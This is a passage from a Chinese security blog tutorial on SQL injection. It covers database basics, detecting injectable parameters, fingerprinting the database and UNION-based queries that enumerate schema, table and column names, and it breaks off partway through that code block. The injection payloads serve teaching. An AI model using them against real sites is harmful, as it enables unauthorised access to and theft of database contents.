<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>常见安全漏洞-SQL注入 | 浔若-学习日记</title><script>!function(e){"use strict";!function(){var i,s=window,o=document,a=e,c="".concat("https:"===o.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=o.createElement("script"),r=o.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",a.d=n,i=function(){s.LA.ids.push(a)},s.LA?s.LA.ids&&i():(s.LA=e,s.LA.ids=[],i()),r.parentNode.insertBefore(n,r)}()}({id:"K0S1pJ29H2ukhGgL",ck:"K0S1pJ29H2ukhGgL"})</script><meta name=author content="xunruo"><meta name=author-link content="https://xunruo.top"><meta name=description content="SQL注入相关基础知识"><meta name=keywords content="SQL注入"><meta itemprop=name content="常见安全漏洞-SQL注入"><meta itemprop=description content="SQL注入相关基础知识"><meta itemprop=datePublished content="2023-03-30T17:12:00+08:00"><meta itemprop=dateModified content="2023-03-30T17:12:00+08:00"><meta itemprop=wordCount content="7485"><meta itemprop=image content="https://npm.elemecdn.com/xunruo@0.0.0/themes/butterfly/source/img/avatar.png"><meta itemprop=keywords content="SQL注入,"><meta property="og:title" content="常见安全漏洞-SQL注入"><meta property="og:description" content="SQL注入相关基础知识"><meta property="og:type" content="article"><meta property="og:url" content="https://xunruo.top/post/9a9550e5/"><meta property="og:image" content="https://npm.elemecdn.com/xunruo@0.0.0/themes/butterfly/source/img/avatar.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-30T17:12:00+08:00"><meta property="article:modified_time" content="2023-03-30T17:12:00+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://npm.elemecdn.com/xunruo@0.0.0/themes/butterfly/source/img/avatar.png"><meta name=twitter:title content="常见安全漏洞-SQL注入"><meta name=twitter:description content="SQL注入相关基础知识"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=referrer content="never"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://npm.elemecdn.com/xunruo@0.0.0/themes/butterfly/source/img/avatar.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://xunruo.top/post/9a9550e5/><link rel=prev href=https://xunruo.top/post/543fca94/><link rel=next href=https://xunruo.top/post/0c6b621a/><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://npm.elemecdn.com/@fortawesome/fontawesome-free@6.2.0/css/all.min.css><link rel=stylesheet href=https://npm.elemecdn.com/animate.css@4.1.1/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见安全漏洞-SQL注入","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/xunruo.top\/post\/9a9550e5\/"},"genre":"posts","keywords":"SQL注入","wordcount":7485,"url":"https:\/\/xunruo.top\/post\/9a9550e5\/","datePublished":"2023-03-30T17:12:00+08:00","dateModified":"2023-03-30T17:12:00+08:00","publisher":{"@type":"Organization","name":"xunruo"},"author":{"@type":"Person","name":"xunruo"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=浔若-学习日记><span class=header-title-text>XR</span></a><span class=header-subtitle></span></div><div class=menu><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/ title=我的所有文章><i class='fas fa-inbox'></i> 文章</a></li><li class=menu-item><a class=menu-link href=/tags/ title=标签页><i class='fas fa-tags'></i> 标签</a></li><li class=menu-item><a class=menu-link href=/categories/ title=分类页><i class='fas fa-file'></i> 分类</a></li><li class=menu-item><a class=menu-link href=/friends/ title=友链><i class='fas fa-link'></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/ title=关于我><i class='fas fa-address-card'></i> 关于</a></li></ul></nav></div><div class=menu><nav><ul class=menu><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=浔若-学习日记><span class=header-title-text>XR</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/posts/ title=我的所有文章><i class='fas fa-inbox'></i> 文章</a></li><li class=menu-item><a class=menu-link href=/tags/ title=标签页><i class='fas fa-tags'></i> 标签</a></li><li class=menu-item><a class=menu-link href=/categories/ title=分类页><i class='fas fa-file'></i> 分类</a></li><li class=menu-item><a class=menu-link href=/friends/ title=友链><i class='fas fa-link'></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/ title=关于我><i class='fas fa-address-card'></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><nav aria-label=breadcrumb class=breadcrumb-container><ol class=breadcrumb><li class=breadcrumb-item><a href=/posts/ title=Posts>Posts</a></li><li class="breadcrumb-item active" aria-current=page>常见安全漏洞-SQL注入</li></ol></nav><main class="container container-reverse"><aside class=toc id=toc-auto><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside><aside class=aside-custom></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>常见安全漏洞-SQL注入</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://xunruo.top title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
xunruo</a></span>
<span class=post-category>收录于 <a href=/categories/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> 常见安全漏洞</a></span></div><div class=post-meta-line><span title="发布于 2023-03-30 17:12:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden=true></i><time datetime=2023-03-30>2023-03-30</time></span>&nbsp;<span title="更新于 2023-03-30 17:12:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden=true></i><time datetime=2023-03-30>2023-03-30</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 7485 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 15 分钟</span>&nbsp;<span id=/post/9a9550e5/ class=comment-visitors data-flag-title=常见安全漏洞-SQL注入>
<i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=twikoo_visitors>-</span>&nbsp;次阅读
</span>&nbsp;<span id=/post/9a9550e5/ class=comment-count data-flag-title=常见安全漏洞-SQL注入>
<i class="fa-regular fa-comments fa-fw me-1" aria-hidden=true></i><span id=twikoo-comment-count>-</span>&nbsp;条评论
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1数据库基础知识>1、数据库基础知识</a><ul><li><a href=#11-定义>1.1 定义</a></li><li><a href=#12-分类>1.2 分类</a></li><li><a href=#13-相关知识>1.3 相关知识</a></li><li><a href=#14-information-shcema>1.4 information-shcema</a></li></ul></li><li><a href=#2sql注入>2、SQL注入</a><ul><li><a href=#21-定义>2.1 定义</a></li><li><a href=#22-注入分类>2.2 注入分类</a></li></ul></li><li><a href=#3判断sql注入>3、判断SQL注入</a><ul><li><a href=#31-判断是否存在sql注入>3.1 判断是否存在sql注入</a></li><li><a href=#32-判断注入类型>3.2 判断注入类型</a></li><li><a href=#33-sql-数据库的类型>3.3 SQL 数据库的类型</a><ul><li><a href=#331-通过报错信息>3.3.1 通过报错信息</a></li><li><a href=#332-数据库标志性信息>3.3.2 数据库标志性信息</a></li><li><a href=#333-数据库特有库名>3.3.3 数据库特有库名</a></li><li><a href=#334-数据库特有函数>3.3.4 数据库特有函数</a></li><li><a href=#335-字符串处理方式>3.3.5 字符串处理方式</a></li><li><a href=#336-特殊符号及注释>3.3.6 特殊符号及注释</a></li></ul></li></ul></li><li><a href=#4联合查询注入>4、联合查询注入</a><ul><li><a href=#41-原理>4.1 原理</a></li><li><a href=#42-常用语句>4.2 常用语句</a></li></ul></li><li><a href=#5时间型盲注布尔型盲注>5、时间型盲注&布尔型盲注</a><ul><li><a href=#51-原理示意>5.1 原理示意</a></li><li><a href=#52-常用函数>5.2 常用函数</a><ul><li><a href=#521-编码转换函数>5.2.1 编码转换函数</a></li><li><a href=#522-条件判断函数>5.2.2 条件判断函数</a></li><li><a href=#523-截取函数>5.2.3 截取函数</a></li><li><a href=#524-延时函数>5.2.4 延时函数</a></li><li><a href=#525-其它函数>5.2.5 其它函数</a></li></ul></li></ul></li><li><a href=#6盲注的加速方式>6、盲注的加速方式</a><ul><li><a href=#61-dnslog注入>6.1 DNSlog注入</a><ul><li><a href=#基本原理>基本原理</a></li><li><a href=#unc路径>UNC路径</a></li><li><a href=#secure_file_priv>secure_file_priv</a></li><li><a href=#load_file函数>load_file函数</a></li><li><a href=#dnslog盲注实例>DNSlog盲注实例</a></li></ul></li></ul></li><li><a href=#7报错型注入>7、报错型注入</a><ul><li><a href=#71-原理>7.1 原理</a></li><li><a href=#72-常用函数>7.2 常用函数</a><ul><li><a href=#721-updatexml>7.2.1 updatexml</a></li><li><a href=#722-floor-显错注入>7.2.2 floor 显错注入</a></li><li><a href=#723-其它显错注入>7.2.3 其它显错注入</a></li></ul></li></ul></li><li><a href=#8堆叠注入>8、堆叠注入</a></li><li><a href=#9-waf-绕过>9 WAF 绕过</a><ul><li><a href=#91-and-和-or-绕过>9.1 and 和 or 绕过</a></li><li><a href=#92-union-过滤绕过>9.2 union 过滤绕过</a></li><li><a href=#93-where-过滤绕过>9.3 where 过滤绕过</a></li><li><a href=#94-limit-过滤绕过>9.4 limit 过滤绕过</a></li><li><a href=#95-group-by-过滤绕过>9.5 group by 过滤绕过</a></li><li><a href=#96-select-及单引号过滤绕过>9.6 select 及单引号过滤绕过</a></li><li><a href=#97-hexunhex-及-substr-过滤绕过---binary>9.7 hex、unhex 及 substr 过滤绕过 - binary</a></li><li><a href=#98-空格过滤绕过>9.8 空格过滤绕过</a></li><li><a href=#99-等号过滤绕过>9.9 等号过滤绕过</a></li><li><a href=#910-其它类型的绕过>9.10 其它类型的绕过</a></li></ul></li><li><a href=#10二次注入>10、二次注入</a><ul><li><a href=#101-原理>10.1 原理</a></li><li><a href=#102-实例>10.2 实例</a></li></ul></li><li><a href=#11sql-注入命令执行>11、SQL 注入命令执行</a><ul><li><a href=#111-sql-注入写文件>11.1 SQL 注入写文件</a><ul><li><a href=#1111-union-select-后写入>11.1.1 union select 后写入</a></li><li><a href=#1112-行分隔符写入>11.1.2 行分隔符写入</a></li></ul></li><li><a href=#112-用户自定义函数---udf>11.2 用户自定义函数 - UDF</a><ul><li><a href=#1121-udf-库文件获取>11.2.1 UDF 库文件获取</a></li><li><a href=#1122-udf-库文件写入>11.2.2 UDF 库文件写入</a></li><li><a href=#1123-dumpfile-vs-outfile>11.2.3 dumpfile vs. outfile</a></li><li><a href=#1124-自定义函数>11.2.4 自定义函数</a></li></ul></li><li><a href=#113-自动化工具>11.3 自动化工具</a></li></ul></li><li><a href=#12注入技巧>12、注入技巧</a><ul><li><a href=#121-select-注入>12.1 SELECT 注入</a><ul><li><a href=#1211-注入点在-select_expr>12.1.1 注入点在 select_expr</a></li><li><a href=#1212-注入点在-table_reference>12.1.2 注入点在 table_reference</a></li><li><a href=#1213-注入点在-where-或-having-后>12.1.3 注入点在 WHERE 或 HAVING 后</a></li><li><a href=#1214-注入点在-group-by-或-order-by-后>12.1.4 注入点在 GROUP BY 或 ORDER BY 后</a><ul><li><a href=#12141-利用报错>12.1.4.1 利用报错</a></li><li><a href=#12142-利用延时>12.1.4.2 利用延时</a></li><li><a href=#12143-利用----位运算符进行-order-by>12.1.4.3 利用 & | ^ 位运算符进行 order by</a></li><li><a href=#12144-利用括号闭合进行联合查询>12.1.4.4 利用括号闭合进行联合查询</a></li></ul></li><li><a href=#1215-注入点在-limit-后>12.1.5 注入点在 LIMIT 后</a></li></ul></li><li><a href=#122-insert-注入>12.2 INSERT 注入</a><ul><li><a href=#1221-注入点位于-table_name>12.2.1 注入点位于 table_name</a></li><li><a href=#1222-注入点位于-values>12.2.2 注入点位于 VALUES</a><ul><li><a href=#12221-insert-延时>12.2.2.1 INSERT 延时</a></li><li><a href=#12222-insert-报错>12.2.2.2 INSERT 报错</a></li></ul></li></ul></li><li><a href=#123-update-注入>12.3 UPDATE 注入</a><ul><li><a href=#1231-update-报错>12.3.1 UPDATE 报错</a></li><li><a href=#1332-update-延时>13.3.2 UPDATE 延时</a></li></ul></li><li><a href=#124-delete-注入>12.4 DELETE 注入</a><ul><li><a href=#1241-delete-延时>12.4.1 DELETE 延时</a></li><li><a href=#1342-delete-报错>13.4.2 DELETE 报错</a></li></ul></li><li><a href=#135-descibe-注入>13.5 DESCIBE 注入</a></li></ul></li><li><a href=#13nosql-注入>13、NoSQL 注入</a><ul><li><a href=#131-定义>13.1 定义</a></li><li><a href=#132-注入原理一>13.2 注入原理一</a></li><li><a href=#133-注入原理二>13.3 注入原理二</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>SQL注入相关基础知识</p><h2 id=1数据库基础知识>1、数据库基础知识</h2><h3 id=11-定义>1.1 定义</h3><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>数据库是一个存储数据的仓库，</p><p>以一定方式存储在一起、能与多个用户共享、具有尽可能小的冗余度，与应用程序彼此独立的数据集合</p></div></div></div><h3 id=12-分类>1.2 分类</h3><p><strong>关系型数据库-SQL</strong></p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>类似表格，表与表之前存在复杂的关系</p><p>举例：MySQL、SQLServer</p></div></div></div><p><strong>非关系型数据库 - NoSQL</strong></p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>Key - Value 形式，简化数据库结构、避免冗余。</p><p>举例：MangoDB、Redis、memcached</p></div></div></div><h3 id=13-相关知识>1.3 相关知识</h3><div class=highlight id=id-1><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--查看数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>show</span><span class=w> </span><span class=n>databases</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--使用数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>use</span><span class=w> </span><span class=n>information_schema</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看当前使用数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>database</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看数据表
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>show</span><span class=w> </span><span class=n>tables</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看数据库版本
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>version</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--使用当前数据库的用户
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看数据库路径
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=n>datadir</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看安装路径
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=n>basedir</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--查看系统类型
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=n>version_compile_os</span></span></span></code></pre></td></tr></table></div></div><h3 id=14-information-shcema>1.4 information-shcema</h3><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>mysql 5.0版本以下不存在information_schema</div></div></div><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>是信息数据库其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。对于 Web 渗透过程中用途很大</p><p><strong>SCHEMATA</strong> 表：提供了当前 MySQL 实例中所有数据库的信息。是 show databases 的结果取之此表。</p><img src=https://s1.vika.cn/space/2023/03/30/9659cbfd083b4980b31e325b47f86ea5 style=zoom:67%><p><strong>TABLES</strong> 表：提供了关于数据库中的表的信息(包括视图)。</p><img src=https://s1.vika.cn/space/2023/03/30/92b2a3de224a43be88466d98ebce6656 style=zoom:67%><p><strong>COLUMNS</strong> 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</p><img src=https://s1.vika.cn/space/2023/03/30/ab7b11b5d0f54044a95110bc9fa6c502 style=zoom:67%></div></div></div><h2 id=2sql注入>2、SQL注入</h2><h3 id=21-定义>2.1 定义</h3><p>Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执 行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执 行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以 及绕过登录限制等</p><div class="details admonition tip open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-lightbulb fa-fw" aria-hidden=true></i>形成原因<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>用户能够控制传参</li><li>SQL 语句中拼接了用户传参的内容</li><li>拼接后的 SQL 语句在数据库中执行</li></ul></div></div></div><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-list-ul fa-fw" aria-hidden=true></i>摘要<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>总之：将用户输入的数据作为代码带入数据库执行</div></div></div><h3 id=22-注入分类>2.2 注入分类</h3><ul><li>布尔型注入</li><li>联合查询注入</li><li>时间延迟注入</li><li>报错型注入</li><li>堆叠注入</li></ul><h2 id=3判断sql注入>3、判断SQL注入</h2><h3 id=31-判断是否存在sql注入>3.1 判断是否存在sql注入</h3><p><code>https://127.0.0.1/SQL.php?id=1'</code></p><p>如果页面返回错误，则存在 SQL 注入；原因是无论字符型还是整型都会因为单引号个数不匹配而报错</p><h3 id=32-判断注入类型>3.2 判断注入类型</h3><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-list-ul fa-fw" aria-hidden=true></i>摘要<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>数字型：</p><p>构造url</p><p><code>https://127.0.0.1/SQL.php?id=1 and 1=1</code></p><p><code>https://127.0.0.1/SQL.php?id=1 and 1=2</code></p><p>查看结果是否相同，若1=1正常返回信息；1=2没有正常返回信息则证明存在数字型注入</p></div></div></div><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-list-ul fa-fw" aria-hidden=true></i>摘要<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>字符型：</p><p>构造url</p><p><code>https://127.0.0.1/SQL.php?id=1' and '1'='1'</code></p><p><code>https://127.0.0.1/SQL.php?id=1' and '1'='2'</code></p><p>查看结果是否相同，若'1&rsquo;=&lsquo;1&rsquo;正常返回信息；&lsquo;1&rsquo;=&lsquo;2&rsquo;没有正常返回信息则证明存在数字型注入</p></div></div></div><h3 id=33-sql-数据库的类型>3.3 SQL 数据库的类型</h3><h4 id=331-通过报错信息>3.3.1 通过报错信息</h4><ul><li>MySQL</li></ul><blockquote><p>you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x</p></blockquote><ul><li>Access</li></ul><blockquote><p>Microsoft JET Database…</p></blockquote><ul><li>MSSQL</li></ul><blockquote><p>Microsoft ODBC Database…</p></blockquote><h4 id=332-数据库标志性信息>3.3.2 数据库标志性信息</h4><p><strong>sql server</strong>：<code>select @@version--</code></p><p><strong>Oracle</strong>：<code>select banner from v$version</code></p><p><strong>mysql</strong>：<code>select @@version，version()-- ，length(user)>0正常</code></p><p><strong>postgresql</strong>：<code>select version()--</code></p><h4 id=333-数据库特有库名>3.3.3 数据库特有库名</h4><p><strong>MySQL</strong>：information_schema</p><p><strong>Access</strong>：mysysobjects</p><p><strong>Oracle</strong>：sys.user_tables</p><p><strong>MSSQL</strong>：sysobjects</p><h4 id=334-数据库特有函数>3.3.4 数据库特有函数</h4><p><strong>sql server</strong>：@@pack_received @@rowcount</p><p><strong>mysql</strong>：connection_id()、last_insert_id()、row_count()</p><p><strong>orcale</strong>：bitand(1,1)</p><p><strong>postgresql</strong>： select extract(dow from now())</p><p>在 mssql 中可以调用 substring。oracle 则只可调用 substr</p><h4 id=335-字符串处理方式>3.3.5 字符串处理方式</h4><p><strong>mssql</strong>：<code>id=1 and 'a'+'b'='ab'</code></p><p><strong>mysql</strong>：<code>id=1 and 'a'+'b'='ab' ， 'ab'=concat('a','b')</code></p><p><strong>oracle</strong>：<code>id=1 and 'a'+'b'='a'||'b' ，'ab'=concat('a','b')</code></p><p><strong>postgresql</strong>：<code>id=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b')</code></p><h4 id=336-特殊符号及注释>3.3.6 特殊符号及注释</h4><ol><li><code>null</code> 和 <code>%00</code> 是 access 支持的注释</li><li><code>#</code> 是 MySQL 中的注释符，返回错误说明该注入点可能不是 MySQL，另外也支持<code>--</code>，和 <code>/* */</code> 注释</li><li><code>--</code> 和 <code>/* */</code> 是 Oracle，SQL server 和 MySQL 支持的注释符，如果正常，说明可能就是这三个数据库其中之一。</li><li><code>;</code> 是子句查询标识符，在 Oracle 中不支持多行查询，返回错误，很可能是 Oracle 数据库。</li></ol><h2 id=4联合查询注入>4、联合查询注入</h2><h3 id=41-原理>4.1 原理</h3><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>union操作用于合并两个查询或者多个select语句的结果集</p><p>TIP：union内部的select语句必须有相同数量的列，当不同时不能正常执行会出现报错信息</p><img src=https://s1.vika.cn/space/2023/03/31/3155fad5e12943cd8caf931c0358777c style=zoom:67%></div></div></div><h3 id=42-常用语句>4.2 常用语句</h3><div class=highlight id=id-2><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--库名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>schema_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>schema_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--表名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;security&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--列名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;security&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;emails&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--数据
